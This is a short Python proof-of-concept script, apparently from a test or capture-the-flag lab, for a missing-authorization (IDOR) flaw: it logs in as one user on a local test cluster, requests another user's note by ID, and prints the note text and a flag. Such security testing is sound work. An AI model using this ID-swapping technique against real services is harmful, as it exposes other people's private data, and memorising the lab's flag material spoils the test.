"""CWE-862 PoC: Alice reads Bob's note."""
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from tests.test_system import Cluster

with Cluster('idor') as cluster:
    token = cluster.login('alice')
    status, result = cluster.call('/read', {'id': 2}, token)
    print(status, result.get('text'), result.get('flag'))
